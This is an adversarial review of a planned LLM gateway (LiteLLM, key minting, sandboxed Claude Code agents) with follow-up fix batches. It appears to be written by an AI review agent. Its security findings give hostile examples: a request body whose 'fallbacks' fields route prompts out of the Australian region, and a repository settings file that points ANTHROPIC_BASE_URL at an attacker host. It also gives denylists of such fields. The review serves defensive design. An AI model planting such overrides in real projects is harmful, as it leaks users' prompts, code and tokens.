# Phase 6 gateway plan: adversarial review

Reviewer: plan-review agent, 2026-09-25. Read-only on the plan; this file is the only write.
Scope: `2026-09-25-phase-6-gateway.md` (the skeleton, 331 lines) and `2026-09-25-phase-6-gateway-parts/task-01.md` … `task-25.md` (20,481 lines), read one part at a time in line ranges.

Severity: **Critical** = an implementer following the text builds something insecure or that cannot work; **Important** = a real defect or contradiction that costs rework; **Minor** = wording, citation or sizing.

## 1. Citations checked against the real tree

| Citation | Result |
|---|---|
| `go.work:3-6` (`./control-plane`, `./sandboxd`), `go 1.23` | verified |
| `control-plane/go.mod:1` module path; `k8s.io/client-go v0.31.1` already required | verified (`go.mod:10`) |
| `control-plane/internal/httpx/problem.go:93` `WriteProblem`, `:125` `DecodeJSON` | verified |
| `control-plane/internal/backend/backend.go:168-172` Kata returns `ErrUnsupported` for `Mounts` | verified (comment at `:168-172`) |
| `control-plane/internal/api/api.go:218-264` the route table | verified (table comment `:218`, `HandleFunc` `:264`) |
| `docs/superpowers/planning/2026-09-23-owner-decisions.md:140-152` OD-19 … OD-24 | verified |
| `docs/PROGRAM.md:113-114` phase 6, `:132` never-pool, `:138` open risk 2 | verified |
| `05-design.md:193-257` §2.5 | verified; the plan follows it except where §3 says |
| Hub contract `:576-578` routes 14, 15, 16; `:614-615` null rule; `:618-619` `User` | verified, **but route 16 (`PATCH /v1/projects/{projectId}`) is role `A`, not `M`**: see I-3 |
| phase 8 plan `:141` P8-D12, `:330` precondition, `:452` Entra-only Postgres, `:464` proving dir (task 32), `:469` netpolcover | verified in `.claude/worktrees/env` at `9ef70c3` |
| phase 8 task 32 "the Kata proving checklist" (`:621`) | exists; the Secret-volume and source-address probes are **asks** into it, not yet in its text |

## 2. Skeleton findings

**I-1 (Important) Wave 6 runs task 19 beside its own dependency.** The task table gives 19 `Depends on 02, 08, 12`; the wave list puts 12 and 19 both in wave 6 (skeleton `:195`). Rule stated at `:188`: a task starts when everything it depends on is merged. Fix: move 19 to wave 7 (it then still precedes 24 in wave 8).

**I-2 (Important) The ratchet is universal; the source design keeps a solo project's choice.** `05-design.md` §2.5: *"A solo project keeps the user's choice. On a team project the route is project-wide … only an org-level compliance role may lower it."* Task 01's `CanChange` refuses every member lowering, solo or team, and task 21 passes the local user as a member, so a solo developer who pressed *Keep inference in Australia* can never go back without a compliance role that local mode does not have (ask H-4). OD-19 says only that the user can trigger AU. Either take the design's rule (`Actor` gains `Solo bool`; a solo project's owner may lower to the floor) or put the universal ratchet to the owner as a question. Today it is a silent change to the design.

**I-3 (Important) Ask H-1 asks a member to raise through an admin route.** H-1 says route 16 accepts `inferenceRoute` and enforces *"raise by any member"*; route 16's role is `A` (`hub-contract.md:578`). As written the Hub refuses a member's raise before task 01's rule runs. H-1 must ask for either a member-role inference route (`PATCH /v1/projects/{projectId}/inference`, the same shape task 21 serves locally) or a field-level role exception on route 16, and say which.

**M-1 (Minor) The skeleton contradicts task 07 on idempotency.** Pitfall row 3 (`:102`) says *"A mint is idempotent on `key_alias`, so a retry after a timeout finds the first key"*. Task 07 decision (a) does the opposite, deliberately: a retry revokes the first key and mints again, and task 07 `:1113` says nothing relies on alias uniqueness. Rewrite `:102` to task 07's rule. Likewise task 05's scope still says plain `unique (session_id, generation)`; the part correctly uses the partial index `where revoked_at is null`.

**M-2 (Minor) Attribution ids do not match the Hub's.** keysmith keys a person as `<tid>:<oid>` (task 07); the Hub's principal is `User.id` = `u-…` (`hub-contract.md:618`). The cockpit's per-person usage (task 22) and H-2's per-person budget need one mapping, owned by someone. Name it in H-2.

## 3. Security findings (parts)

**C-1 (Critical) The AU route rests on one JSON field, and the body passes LiteLLM's own routing parameters through.** The only thing that keeps an AU request on Bedrock is task 11's rewrite of `model`. Every other top-level field is relayed byte for byte, by design and by test (skeleton `:240`, *"a body with an unknown top-level field keeps it byte for byte"*). LiteLLM's proxy reads request-body control parameters of its own: client-side `fallbacks`, `context_window_fallbacks`, `mock_testing_fallbacks`, `mock_response`, `api_base`/`base_url`, `user_config` (training knowledge of LiteLLM's proxy, **UNVERIFIED** against the pinned image; whether its `/v1/messages` path honours each is also unverified). Task 18's probe list (P01–P13) asks about `metadata.tags` only. The window is real even with task 07's decision (d), which narrows an **AU-minted** key to `au/*`: a key minted while the project was Global carries every `global/*` group for up to 50 minutes after a raise (P6-D4), and a body `"fallbacks": ["global/claude-opus-4-8"]` plus a forced primary failure would leave Australia on it. Whether LiteLLM checks a fallback against the key's model list is itself unverified, which would reopen AU-minted keys too.
Fix, three parts, about 2 hours: (1) task 11 drops a named denylist of LiteLLM control fields from the body (not an allowlist, which the docs forbid), each with a test and a mutant; (2) task 18 gains P14, *"a body `fallbacks`/`mock_testing_fallbacks` on an `au/` group never reaches the `global` fake"*, a FAIL of which is an owner blocker like P06; (3) keysmith re-mints on a raise (the route source already sees it within 30 s), so no Global-minted key outlives a raise by more than one refresh.

**I-4 (Important) A repository can move `ANTHROPIC_BASE_URL`.** Task 14 puts only `apiKeyHelper` and two variables in the managed fragment and bans `ANTHROPIC_BASE_URL` from it (`task-14.md:235`); task 15 sets the base URL as launch environment. A project `.claude/settings.json` with `"env": {"ANTHROPIC_BASE_URL": "https://attacker"}` is repository content the agent does not control, and settings `env` is applied to Claude Code's own process (training knowledge, **UNVERIFIED**). The CLI would then send prompts, code and the session token there. Pod binding makes the token useless off the pod; it does nothing for the prompts. `05-design.md` §2.5 requires the product settings to *"deny project `ANTHROPIC_*` env overrides (§7.3)"*; task 14 `:474` defers the rest of that file to S6.6 without naming this item. Fix: the fragment sets `env.ANTHROPIC_BASE_URL` itself, to one name that resolves in both modes (`gatekeeper.panacea-gateway.svc.cluster.local`, a compose network alias locally), since managed settings outrank project settings; task 23 adds a check with a hostile `.claude/settings.json`.

**I-5 (Important) Budgets fail open on an unpriced model, in the cloud.** Task 18 `:11` notes that LiteLLM prices from its built-in cost table and that an unknown id leaves spend at `0`, so *"budgets can never bite"*; its fix is *"explicit local costs"* in task 02. The cloud has the same problem with more force: `claude-opus-5`, `claude-sonnet-5` and the `bedrock/au.anthropic.*` profile ids may be missing from a pinned table. Nothing in task 02, 19 or 24 checks it; task 24's P06 checks only that budgets are set. Result: all three OD-24 budgets silently off. Fix: `models.yaml` carries per-token input and output costs for both routes (marked **UNVERIFIED** prices), `gatewaygen` renders them as `model_info`, a task 02 test refuses a group without a non-zero cost, and task 09's sweep flags a key with `requests > 0` and `spend == 0`.

**I-6 (Important) Local sandboxes can reach LiteLLM directly.** Task 17 puts sandboxes, LiteLLM, keysmith, Postgres and the fakes on the one network `panacea-app-gateway`, and states the residual (`task-17.md:579`). That contradicts P6-D1 (*"compose network, task 17"*) and means task 23 cannot show the architecture's first property locally. Docker fixes it for free: a second, `internal: true` network for gatekeeper, keysmith, LiteLLM, Postgres and the fakes; sandboxes join only `panacea-app-gateway`, which holds the gatekeeper alone. Add a `compose_test.sh` rule: `litellm` and `postgres` are not on the sandbox network.

**I-7 (Important) Attribution and the team budget trust the caller's `TeamID`.** `wire.MintRequest.TeamID` is caller-asserted, `wire.ProjectInference` has no team, and task 07 `:1111` *"trusts its caller"*. The Hub's project record carries `teamId` (`hub-contract.md` §7.1, `Project`), and task 13 already reads that record. Fix: `ProjectInference` gains `TeamID`, and keysmith refuses a mint whose `TeamID` differs from the project's. P8-1 should also say that the broker checks the owner's membership of `ProjectID` in the Hub before it mints; today nothing in any plan does.

## 4. Correctness and coverage findings (parts)

**I-8 (Important) The budget probes test a key shape production never mints.** Every production key carries `user_id` **and** `team_id` (task 07 `:860`). Task 18's P03 mints `{"user_id", "models"}` only and P04 `{"team_id", "models"}` only (`task-18.md:322`, `:324`). Whether LiteLLM applies a user's `max_budget` to a key that also belongs to a team is exactly the open question (training knowledge suggests user budgets may cover personal keys only; **UNVERIFIED**). As written, P03 can PASS while the person dimension is off in production. Fix: P03 and P04 each mint the production shape (`user_id` + `team_id` + a generous key `max_budget`) and exhaust one dimension at a time. P03's stated fallback (the person dimension moves to keysmith's slice) is sound once the probe can see the failure.

**I-9 (Important) No cloud path for the cockpit's spend figures.** Task 21 reads usage from keysmith through the **local** control plane, and task 08's `kube` caller table grants `usage` to nobody (broker: mint, refresh, revoke; gatekeeper: bindings). In the cloud, the only mode the product targets for 90% of people (OD-20), keysmith has no ingress from the laptop and no caller for `usage`, so task 22's panel has nothing to show. Task 21's own gap 5 (`task-21.md:1040`) sees this; the skeleton has no seam or ask for it. Fix: add seam S6.11 (cloud usage read: keysmith pushes the rollup into the Hub, or the broker relays `GET /v1/usage` for the signed-in owner) and an ask of the Hub or phase 8 to match.

**I-10 (Important) Two parts are larger than their hours.** Task 08 is 1,659 lines and four files plus four test files (routes, TokenReview caller auth, caller table, config, fail-closed start) in 3 hours. Task 15 is 1,522 lines across three packages (`gatewayclient`, `backend` + `dockerbe`, `api` + `cmd/api`) in 3 hours. Both sit on the critical path. Split 15 into 15a (`gatewayclient`, 1.5 h) and 15b (launch wiring, 2 h); split 08's `callerauth` (TokenReview, 1.5 h) from the API and config (2 h). The total rises by about 2 hours.

**M-3 (Minor) Up to 60 s of each deleted key's spend is lost.** Task 09's sweep keeps a key's *last recorded* spend, and task 07 deletes a superseded or grace-expired key without a final read, so the team dimension undercounts every refresh and revoke by up to one sweep. Fix: `Revoke`/grace delete call `KeyInfo` once and upsert before `DeleteKeys`.

**M-4 (Minor) The grace inequality forgets the cloud's Secret propagation.** Task 14 pins helper TTL (2 min) < `Grace` (5 min), which is right locally, where the rename is seen at once. In the cloud the token arrives through a Secret volume, and kubelet refreshes those on its sync period plus cache TTL (about 1–2 min, training knowledge, **UNVERIFIED**; and **UNVERIFIED** at all inside Kata, P8-1). Write the inequality as `helper TTL + propagation < Grace` in P8-1, or raise `Grace` to 10 minutes.

**M-5 (Minor) `panacea token` waits 20 s; a retried mint takes up to about 61 s.** Task 15 retries twice on a 20 s timeout with 500 ms backoff; task 14 gives up after 20 s. The first request of a session whose first mint attempt times out fails with *"Your apiKeyHelper script is failing"* (task 14 `:8`). Either the wait covers the retry budget, or the part says the first-request failure is accepted and task 23 observes the CLI's recovery.

**M-6 (Minor) P06 proves ZDR on the success path only.** Task 12's gatekeeper canary runs through a fake LiteLLM that fails with a 500 echoing the body; task 18's P06 runs LiteLLM's canary through a succeeding call. LiteLLM's own failure logging (stdout exceptions, any error-log table) is the likelier leak. Add a P06b: the canary through a fake upstream told to answer `400` echoing the prompt, then the same `pg_dump` and stdout search.

**M-7 (Minor) Two budget clocks, one sentence.** keysmith sums a UTC calendar month (task 06, task 09); LiteLLM's person and project budgets run on `budget_duration: "30d"` from creation (task 07 `:38`, `:581`). On 1 October the cockpit can read *"US$0.00 of US$200 this month"* while LiteLLM still refuses the person on its own window, and task 22's *"can't start until 1 Oct"* is then false. Task 06 records the drift; nothing reconciles it for the reader. Either keysmith sets LiteLLM's reset to the calendar boundary (if the pinned image allows it; task 18 probe), or the panel's reset date comes from LiteLLM's `budget_reset_at` for those two dimensions.

**M-8 (Minor) Task 20's AWS provider range spans a major version** (`>= 5.70.0, < 7.0.0`, `task-20.md:178`). Phase 8's modules use a pessimistic constraint (`~> 4.81`) with the exact version in the lock file (`env/infra/scripts/guards_test.sh:50`, `:140`). Use `~>` on one major version, as phase 8 does.

## 5. Fit with the sibling plans

| Sibling | Fit | Gap |
|---|---|---|
| Hub (phase H) | H-1's JSON is task 01's `ProjectInferenceFields` exactly, with the contract's null rule; route 15 read via `FieldsFromRecord` ignores the record's other keys. Neither the ADR nor the contract mentions a data class today, so H-1 to H-4 are genuine asks | I-3 (route 16 is admin-only); I-7 (`teamId` should come from the record); I-9 (no cloud usage read) |
| Phase 8 | Namespaces, labels and peers in task 19 match the phase 8 parts (`task-13.md:210-215`, `:289-291`; `task-11.md:149-154`, verified); Entra-only Postgres is carried as P8-4; the proving list is task 32 | P8-1 needs the membership check (I-7) and the propagation inequality (M-4); P8-2 should name the AWS projected token audience `sts.amazonaws.com` on the `litellm` service account, which task 19 renders |
| Phase 7 | P7-1 is correctly an ask; the phase 7 plan has no data-class text yet | none beyond the ask |
| Phase 4 | P4-1 and S6.8 carry OD-24's "set at creation" | none |

## 6. What holds up

Tests come first in every code part, and every code part names its mutants in a table (167 mutant references across 23 parts; tasks 23 and 25 are documents). Every part has a "does not claim" section. The interfaces cross-checked between parts agree: `SpentReader.Spent` (tasks 07, 09), the `AdminAPI` subset (tasks 04, 07), `wire.NormalAddr` and `Binding.LiveAt` (tasks 03, 10), `httpx.CodeBackendUnavailable` (real, `problem.go:60`). The Panacea pitfalls each became a rule with a test: full-path `api_base` (task 02), the master key as a refused-if-empty file (tasks 04, 08, 19), own deadlines and mint-beside-start (tasks 04, 15). Task 07's supersede-on-retry with task 05's partial unique index is a better idempotency design than the skeleton's. Task 11 strips every credential-shaped header, not only `x-litellm-*`. Task 14 caught the helper-TTL-equals-grace boundary itself.

## 7. The two defects a first implementer would hit

1. **Budgets record US$0 (I-5).** The first local run prices every call at zero, because the catalogue's ids are newer than LiteLLM's built-in cost table. Task 18's P03–P05 and P12 come back UNKNOWN, task 23 item 5 cannot be shown, and the fix reopens task 02, merged in wave 1. In the cloud the same gap turns all three OD-24 budgets off with no signal.
2. **Wave 6 starts task 19 before task 12 exists (I-1).** The chart's gatekeeper Deployment, its variables and its caller-token mount come from `cmd/gatekeeper`, which is merged in the same wave. Whoever picks up task 19 finds nothing to render against.

The severest finding, C-1, is latent rather than hit: nothing fails until someone sends a crafted body.

## 8. Fix list, in order

1. C-1: body denylist in task 11, P14 in task 18, re-mint on a raise. About 2 hours.
2. I-5: costs in `models.yaml` and a `gatewaygen` test. About 1 hour.
3. I-4: `ANTHROPIC_BASE_URL` in the managed fragment, with one resolvable name. About 1 hour.
4. I-1, I-3, I-7, I-9: skeleton and ask edits. About 1 hour.
5. I-2 to the owner as a question; I-6, I-8, I-10 and the Minors in their parts.

**Plan quality: Needs fixes**

## Fix batch b01 (C-1, I-8), 2026-09-25

Line numbers are as of commit `8b8a7d7`. Parts are in `2026-09-25-phase-6-gateway-parts/`. "Skeleton" is `2026-09-25-phase-6-gateway.md`.

**C-1 (1), task 11 drops a named denylist.** Fixed as the review asks, with a wider list.
- `task-11.md:14`, decision (f): `proxy.ControlFields` holds fifteen names. They are the review's seven plus eight of the same kind: `content_policy_fallbacks`, `mock_testing_context_fallbacks`, `mock_testing_content_policy_fallbacks`, `mock_testing_rate_limit_error`, `api_key`, `api_version`, `aws_region_name`, `aws_bedrock_runtime_endpoint`. All are **UNVERIFIED** against the pinned image. A body `aws_region_name` would move a Bedrock call out of `ap-southeast-2`, which is why it is on the list.
- Matching and splicing: the match is on the decoded top-level key. Decision (a)'s splice leaves out the dropped member's byte range, separator included (`task-11.md:568`, `:660`). It is a denylist, not an allowlist.
- Tests: `TestLiteLLMControlFieldsNeverReachUpstream` (`:290`) has one row per name, from the test's own copy of the list, plus an escaped `fallbacks` row. `TestDroppingAFieldKeepsEveryOtherByte` (`:316`) covers first, middle, last and two-leading drops, byte-exact and `json.Valid`.
- Mutants: three new table rows, plus fifteen scripted **rename** mutants (`:1015`), one per name. A delete would trip the length check and prove nothing about the row.
- Restatements fixed: `task-11.md:3`, `:5`, the proxy package comment, "Does not claim" (`:1069`), gap 5 (`:1081`); skeleton `:240` (the scope line the review names, including its test list); `task-12.md:759`.

**C-1 (2), task 18 gains P14.** Fixed as the review asks.
- The probe (`task-18.md:32`, code `:357`): it sends `fallbacks` + `mock_testing_fallbacks` on `au/claude-opus-4-8` straight to LiteLLM, with two production-shaped keys. One is an AU-minted key naming `au/*` only; the other is a Global-minted key naming both groups.
- Verdicts (`v_p14`, `:236`): any request at `fakeanthropic-global` is a FAIL. A primary that reached `fakeanthropic-au` is UNKNOWN (the mock never fired), never PASS. The self-test has four new cases (31 → 35, `:562`) and a vacuity mutant.
- A FAIL is an owner blocker like P06, and exits 3 (`:551`).
- Restatements fixed: the blocker set is now P06, P13 and P14 (`task-18.md:5`, `:41`, step 9, commit body; `task-23.md:37`); skeleton `:258`; the new register row `task-25.md:125` (U20).

**C-1 (3), re-mint on a raise.** The review's wording is wrong on one fact, so the root cause is fixed another way.
- Why not keysmith: keysmith never holds a token after the mint reply (task 07 decision (f)). A key it re-minted by itself would be a key nobody holds, the one thing task 07 must not get wrong.
- keysmith retires instead: `task-07.md:41`, decision (h). `*Service` is the `wire.BindingReader` behind the gatekeeper's binding route (`ByKeyHash`, `:893`). A live Global-minted key whose project is now AU has its revocation dated `Grace` from now, and its LiteLLM key is deleted then. The bound after the first request following a raise: the route cache (≤ 30 s) plus the binding cache (≤ 10 s) plus `Grace` (5 min).
- Task 07 tests and mutants: `:555` and `:590`, five mutants (8 → 13), 14 → 16 tests.
- The refresher re-mints: `task-15.md:1159` (`sleepUnlessRaised`) and `RaiseCheck` (`:1001`), with test `:416` and two mutants. `task-08.md:1533` wires the Service in (gap `:1662`). Ask P8-1 (skeleton `:306`) makes the cloud broker do the same.
- Restatements fixed: skeleton `:68` (P6-D4), `:230` (task 07 scope; its `Models` clause also contradicted decision (d)), `:232`, `:250`.

**I-8, P03 and P04 mint the production shape.** Fixed as the review asks, and extended to P05 for the same root cause.
- `task-18.md:15`, table `:21` to `:23`, code `:302` (`prod_key`), `:306` (`budget_probe`).
- Each key carries `user_id` + `team_id` + a key `max_budget`. The dimension under test is at 1e-9 and the other two at US$1,000.
- Skeleton `:258` says the same.

**A new finding outside the review (N-1, fixed at its root).** Task 15's `refreshLoop` sent the **current** generation. Task 03's `RefreshRequest` names the **new** one (`task-03.md:447`), and task 07 refuses generation 1 as invalid, so every session's first refresh would have failed.
- It now sends `gen + 1` (`task-15.md:1133`).
- The existing refresher test asserts generation 2, and a mutant covers it (`:1558`). Recorded in task 15's gap 7 (`:1599`).

**Deferred:** none. **Owner questions:** none new. A P14 FAIL reaches the owner through task 18's step 9.

## Fix batch b01, round 2 (re-review R-1 to R-7), 2026-09-25

Fixes the open issues of `.superpowers/sdd/p6/plan-rereview-b01-1.md`. Line numbers are as of commit `ab7b680`, with task 15 as of `c1a8c58`. The counts in round 1 above (fifteen names, 35 cases, 13 task 07 mutants) are superseded by the ones below.

**R-1 (Important), the escaped row now escapes.**
- Cause: the Edit tool decodes a backslash-u escape in its arguments, so the round-1 text lost it. The escape is now written through a script that builds the backslash with `chr(92)`, and `od -c` confirms the bytes `f \ u 0 0 6 1 l l b a c k s`.
- `task-11.md:298`, the row sends `"f\u0061llbacks"` in a Go raw string. `:21`, decision (f) shows the escaped spelling.
- `task-11.md:1016`, a new step 6 mutant: `drop: controlField[key] && bytes.Contains(body[prev:begin], []byte(key))`, a raw-bytes match. It is killed by `TestLiteLLMControlFieldsNeverReachUpstream/escaped_fallbacks` alone. `:1007`, a grep that proves the escape reached the test file before that mutant runs. Hand mutants 7 → 8 (`:1005`, `:1074`).
- Skeleton `:240` shows the escape and says the escaped row kills a raw-bytes key match.

**R-2 (Important), P14 cannot pass vacuously.**
- Path 1, no key: `task-18.md:402`, the client records a key that did not mint as status `None`. `v_p14` (`:248`) makes that a FAIL (`:255`). A status of `0`, `401` or `403` is UNKNOWN (`:260`). The leak check stays first, so a record at the Global fake is a FAIL whatever the status.
- Path 2, anthropic mode: `v_upstreams` (`:268`) and the `upstreams` entry mode (`:481`) read `/model/info` inside the LiteLLM container. `probe.sh` (`:548`) exits 2 unless every `global/` group's `api_base` host is `fakeanthropic-global` and every `au/` group's is `fakeanthropic-au`. No probe then runs against the real provider.
- Self-test: `p14 unauthorised` → UNKNOWN, `p14 no key` → FAIL (`:115`), and three `upstreams` cases (`:119`), 35 → 40 (`:618`). Two more vacuity mutants in step 6 (`:618`).
- The nine P14 and upstreams rows were evaluated against the functions as the plan writes them: 9 of 9 give the planned verdict, and there are 40 cases in total. That was a scratch Python run on the text, not the real `probe.sh`.
- Restatements: the P14 row (`:32`), the interface line (`:41`), the script header, a new "does not claim" bullet (`:730`: `/model/info` exposing `api_base` is **UNVERIFIED**, and the gate fails closed if it does not), skeleton `:258`.

**R-3 (Minor), one delete per retirement.** `task-07.md:871`, `Refresh` schedules its delete inside the "date the revocation" branch. A retried refresh, or a refresh after decision (h)'s retire, schedules nothing. `:604`, the decision (h) test refreshes after the retire and asserts one scheduled delete. `:1234` is the mutant. `:31`, decision (c) says so, and says that LiteLLM's answer to deleting a missing key stays **UNVERIFIED**, since nothing now asks it.

**R-4 (Minor), the delay is tested.** `task-07.md:180`, `:202`, the rig records `(d, f)` pairs. Both tests assert the delete waits 5 minutes: `:434` for `Refresh` (the survivor from before b01) and `:595` for `ByKeyHash`. The mutants are `:1232` and `:1233`. Task 07 has 13 → 16 mutants (`:1255`) and still 16 tests.

**R-5 (Minor), the Bedrock credential fields are dropped.** `task-11.md:577` (`ControlFields`) and `:284` (the test's copy) gain `aws_access_key_id`, `aws_secret_access_key`, `aws_session_token`, `aws_role_name`, `aws_session_name`, `aws_profile_name`, `aws_web_identity_token`, `aws_sts_endpoint` and `custom_llm_provider`, 15 → 24 (`:14`, 3 + 5 + 16). The rename-mutant loop is at `:1031`. Every "fifteen" in the part now says twenty-four. The restatements are skeleton `:240`, `task-18.md:731` and `task-25.md:125`. The names are still **UNVERIFIED** against the pinned image.

**R-6 (Minor), one live-route rule.** The fix is at the root, wider than the re-review's two sides, because the gatekeeper was a third copy.
- `task-03.md:21`, decision (g): `wire.ProjectInference.LiveRoute()` (`:558`) is `Tighter(Decide(class, route), Effective)`, and an error for anything unparsed. `TestLiveRoute` (`:215`) has six rows. There are two mutants (`:703`), and the gap is at `:766`.
- The callers: `task-07.md:1027` (keysmith's `route`, with a preflight grep at `:57`), `task-10.md:473` (step 7, with its mutant row at `:506` renamed), and `task-15.md:1261` (`raisedToAU`, used by `sleepUnlessRaised`) and `:1128` (`Prepare`).
- `task-15.md:430`: `TestARaiseRefreshesAtOnce` gains a `class` row that raises through `DataClass` alone while `Effective` stays on Global. Its mutant (`:1663`) reads `Effective` alone. The fakes carry a class (`:248`, `:414`).
- Skeleton `:220` and `:250`.

**R-7 (Minor), P6-D4 states the part's bound.** Skeleton `:68`: the key is retired, not narrowed. The bound after the first request following the raise is the route cache (≤ 30 s) plus the binding cache (≤ 10 s) plus `Grace` (5 min), task 07's own words at `:45`. The refresher re-mints within `RaiseCheck` (1 min) of its route source showing the raise. The re-review's note (narrow the key with `/key/update` when it is retired) is not built. It rests on an **UNVERIFIED** LiteLLM property, and the gatekeeper already sends the key's requests as `au/`.

**Deferred:** none. **Owner questions:** none new.

## Fix batch b02 (I-7, I-5), 2026-09-25

Line numbers are as of commit `85c0b69`. Hub contract lines are in `.claude/worktrees/hub/docs/superpowers/contracts/2026-09-23-hub-contract.md` at `da8c7da`: `Project` at `:637-639`, route 15 at `:577`, "a project's access is exactly its team's membership" at `:333`, and `Team.role` (the caller's role) at `:624-625`.

**I-7 (Important), the team is the project's, not the caller's.**
- `task-03.md:22`, decision (h): `wire.ProjectInference` gains `TeamID` (`:550`), the golden pins `"teamId"` (`:96`), and gap 7 is at `:772`. The decision count now reads eight (`:13`); it said six, which was stale from (g).
- `task-13.md:14`, decision (f): `Hub.Project` reads the record's `teamId` through `teamOf` (`:900`) and refuses a missing or malformed one definitively. `File` leaves `""`. The tests are `TestHubEffectiveRouteIsDecidedNotRead` (pins the team) and `TestHubRefusalsAreDefinitive` (`no team`, `a team not an id`, `:340`; fixtures at `:265`). Mutants 4 → 6 (`:1146`), and the test count stays 18. Gap 5 (`:1185`): task 19 runs both binaries on `ROUTE_SOURCE=hub` (`task-19.md:484`, `:549`), so the cloud never takes the no-teams path.
- `task-07.md:47`, decision (i): `mint` reads the project once through `s.project` (`:1070`) and refuses a differing non-empty team (`:1011`) with `ErrTeamMismatch` (`:769`). That error is an `ErrInvalid`, so it maps to 400 `bad_request` with no new code. The check runs before the spend read and before any LiteLLM call, and `Refresh` inherits it. `TestMintRefusesATeamThatIsNotTheProjects` is at `:263`, with three mutants from `:1283`. Tests 16 → 17 and mutants 16 → 19. "Trusts its caller" (`:1310`) now names what it does not trust, and gap 8 is at `:1327`.
- Skeleton `:220` (03), `:230` (07's mint order) and `:244` (13). Ask P8-1 (`:306`): before minting, the broker uses the owner's own token (`OD-30`) to read route 15, which answers only members, and route 6 for the caller's role. It mints only for `member` or `admin`, and sends the record's `teamId`. keysmith holds no user token, so nothing else can check membership.

**I-5 (Important), no group can spend US$0 silently.**
- `task-02.md:20`, decision (f): each model carries `price.global` and `price.au`, four figures per route in US$ per million tokens, all **UNVERIFIED**. Types are at `:408`. `Cost.validate` (`:547`) refuses a missing, zero, negative or per-token-sized figure (US$0.01–1,000). `TestParseRefusesAnUnpricedModel` is at `:203`, `models.yaml` prices at `:705` onward, the fixture at `:70`. `gatewaygen`'s `modelInfo` (`:1111`) renders each group's own route price per token, and `fixedCosts` (`:1129`) rewrites `5e-06` as `0.000005`, because PyYAML, which LiteLLM loads with, reads an exponent without a dot as a string. `TestEveryGroupIsPricedFromItsOwnRoute` is at `:881`, and the secret walk exempts the four price keys while they hold numbers (`:930`). The five mutants start at `:1367`, and "does not claim" is at `:1430`.
- `task-09.md:39`, decision (g). **The review's check could not fire**, because the part's decision (f) records `Requests` as 0, so "requests > 0 and spend == 0" is never true. The sweep reads the cause instead. `Once` (`:848`) calls `checkPrices` (`:823`), which reads task 04's `ModelPrices` and reports `ErrUnpriced` for each catalogue group that is missing or priced at zero. A nil reader is reported too. `TestSweepReportsAnUnpricedGroup` is at `:432`. There are three mutants, 12/19 passes and 10 edits. A fourth mutant, deleting `!ok`, was equivalent (an unlisted group reads as the zero price), so the code no longer carries `!ok` and that row is gone. Gap 6 is at `:977`.
- `task-04.md:618`: `(*Client).ModelPrices` over `GET /model/info` keeps the lower price when a group has two deployments. The table row is at `:45` and `TestModelPricesKeepsTheLowerPricePerGroup` at `:338`, with one mutant. The unpriced deployment is listed first. With it listed last, the mutant "the last deployment wins" had survived. `task-08.md:1895` wires `Prices` and `Groups` into the `Sweeper`.
- `task-18.md:11`, `:177` and `:689`: an unpriced probe now means LiteLLM does not read the `model_info` keys; it no longer asks task 02 to add costs. `task-24.md:42`: P06 also fails unless `/model/info` shows every group's input and output price above zero (`:605`). The new canned case is at `:242` (36 → 37), and "does not claim" is at `:684`: AU prices against the AWS price list are an operator's check.
- Skeleton `:218` (02), `:224` (04) and `:234` (09).

**Verified in scratch, not in the repository** (`$TEMP/…/scratchpad/p6/b02-scratch`):
- `sigs.k8s.io/yaml` v1.4.0 renders the plan's `modelInfo` as `5e-06`, `1e-06` and `5e-07`.
- The plan's `fixedCosts` rewrites all 12 prices to YAML 1.1 floats that round-trip (`go test`, 2 of 2 pass).
- PyYAML reads `5e-06` as `str`, and `0.000005`, `2.5e-05` and `1.0e-07` as `float`.
- The mutants were reasoned over the plan's code, not run, because none of these packages exists on this branch yet.

**Mutants I expected to survive:** (1) task 04's "the last deployment wins", and (2) task 09's "delete `!ok`". Both did survive. The first is fixed by reordering the test. The second was an equivalent mutant, so its code and its row are removed.

**Deferred:** none. **Owner question (new):** may a team `viewer` launch an agent? Ask P8-1 recommends `member` or `admin` only, and nothing in phase 6 depends on the answer.



## Fix batch b03 (I-4, I-6), 2026-09-26

Line numbers are as of commit `b8cbfa8`. Commits: `b3c260a` (task 14 and skeleton 14), `bb86171` (task 15), `199a49b` (task 17, and task 15's network refusal), `49fe2c5` (task 23), `b8cbfa8` (skeleton, tasks 18, 19 and 25).

**I-4 (Important), a repository's settings can no longer move where prompts go through any door named here** (the endpoint, provider-switch and proxy keys; after round 2, telemetry export and project hooks too). Project MCP servers, plugins and any `env` key the fragment does not name stay open and are named in task 14's "does not claim" (re-review R-1).
- `task-14.md:20`, decision (e): the fragment pins `env.ANTHROPIC_BASE_URL` = `http://gatekeeper.panacea-gateway.svc.cluster.local:4000` (`:439`), the one name for both modes. **The root cause is wider than the one key.** A provider switch with its own base URL and skip-auth flag is the same door, and so is `HTTP_PROXY` over the plain-`http` base URL. So the fragment also pins `CLAUDE_CODE_USE_BEDROCK`, `_VERTEX` and `_FOUNDRY` to `"0"`, and `NO_PROXY`/`no_proxy` to the gatekeeper host. All of that is **UNVERIFIED** (training knowledge). The ban on `ANTHROPIC_BASE_URL` and `CLAUDE_CODE_USE_BEDROCK` in the fragment is gone. The banned list now names the other providers' base URLs.
- `task-14.md:246`, the new `TestTheFragmentPinsTheGatekeeperAsTheOnlyEndpoint`: host, port, no path (so no double-pathed `/v1/messages`), the switches, and the proxy bypass. The exact-keys test (`:227`) carries all eight `env` keys. Tests 11 → 12 and mutants 4 → 7 (`:479`). The fragment is 13 lines (step 8).
- `task-14.md:521-523`, "does not claim": the list is not complete, and stopping a project's `env` from applying at all is seam S6.6's. Managed-over-project precedence, key by key, is **UNVERIFIED** until task 23's item 10 runs. `05-design.md:247`'s *"denies project `ANTHROPIC_*` env overrides"* is now named, and is done here for the endpoint keys. A project's `ANTHROPIC_API_KEY`/`AUTH_TOKEN` only breaks its own session: the request still goes to the pinned gatekeeper, which refuses it. Gap 5 is at `:531`.
- `task-15.md:16`, decision (h): `gatewayclient.SandboxBaseURL` (`:1064`, interface `:37`). `NewLauncher` refuses any other `BaseURL` (`:1115`). `cmd/api` refuses any other `_BASE_URL` (`:1585`), and the default moves off `http://gatekeeper:4000` (`:44`). `TestNewLauncherRefusesAnyOtherBaseURL` is at `:380`. Tests 12 → 13, a config row, and mutants 9 → 11 (`:1682`).
- `task-17.md:55` and `:345`: keysmith's `BASE_URL` is the pinned name. The gatekeeper's alias is at `:369`.
- `task-19.md:494`: the chart fails to render outside namespace `panacea-gateway`, and keysmith's `BASE_URL` is the literal Service name. `render_test` proves the refusal (`:72`).
